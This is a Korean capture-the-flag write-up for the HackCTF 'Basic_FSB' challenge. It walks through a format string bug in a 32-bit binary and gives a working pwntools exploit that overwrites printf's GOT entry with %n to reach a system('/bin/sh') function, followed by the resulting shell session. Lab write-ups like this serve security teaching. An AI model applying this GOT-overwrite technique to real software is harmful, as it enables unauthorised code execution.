# [HackCTF] Basic_FSB

ida로 basic_fsb 바이너리의 main문을 확인해보자.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  vuln();
  return 0;
}
```
main문에서는 stdout을 먼저 세팅해주고 vuln이라는 함수를 호출한다.<br>
vuln이라는 함수를 분석해보자.<br>


```c
int vuln()
{
  char s; // [esp+0h] [ebp-808h]
  char format; // [esp+400h] [ebp-408h]

  printf("input : ");
  fgets(&s, 1024, stdin);
  snprintf(&format, 0x400u, &s);
  return printf(&format);
}
```
ida로 확인해보면 input을 s라는 변수에 1024바이트만큼 저장한다.<br>
그 후에, snprintf 및 printf로 출력을 시켜준다.<br>
추가적으로 보면, flag라는 함수가 있는데, `format string bug`를 이용하면 될 것같은데, 일단 분석을 해보자.<br>

  ```c
  int flag()
  {
    puts("EN)you have successfully modified the value :)");
    puts(aKr);
    return system("/bin/sh");
  }
   ```
flag함수를 보면 `sytstem("/bin/sh");`를 통해 쉘을 실행시켜주는 것을 확인할수있다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./basic_fsb
input : aaaa %p %p %p %p %p
aaaa (nil) 0x61616161 0x20702520 0x25207025 0x70252070
```
일단 바이너리를 실행해본 결과이다.<br>

두번째 `format string`에 aaaa가 들어간것을 확인할수있다.<br>

`format string bug`를 사용할때는 %n을 사용할수있는데, %n은 현재까지 출력된 바이트 수를 계산하여 자신이 출력하는 값을 주소라고 생각하여 계산한 값을 그 주소에 넣는 것이다.<br>
`printf GOT`주소를 구해보자.<br>
```c
gef➤  disas vuln
0x080485a2 <+87>:	lea    eax,[ebp-0x408]
0x080485a8 <+93>:	push   eax
0x080485a9 <+94>:	call   0x80483d0 <printf@plt>
```
vuln함수에서 보면 printf의 plt주소를 알수있다.<br>

```c
gef➤  disas 0x80483d0
Dump of assembler code for function printf@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x804a00c
   0x080483d6 <+6>:	push   0x0
   0x080483db <+11>:	jmp    0x80483c0
End of assembler dump.
```
plt주소를 disas해보면, `0x804a00c`라는 GOT주소를 구할수있다.<br>

따라서 printf의 GOT주소를 `FSB`를 사용하여 flag의 주소(`0x080485b4`)로 덮어씌워주면 문제가 해결가능하다.<br>
0x80485b4 = 134,514,100
## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3002)

p.recvuntil("input : ")

printf_got=0x804a00c

payload=p32(printf_got)
payload+= "%134514096x%n"
// 4byte는 앞에 print_got에서 입력해줬으므로 4byte는 빼고 값을 넣어준다.<br>
p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python ex_fsb.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3002: Done
[*] Switching to interactive mode
EN)you have successfully modified the value :)
KR)#값조작 #성공적 #플래그 #FSB :)
$ ls
flag
main
$ cat flag
HackCTF{}
```

## END !
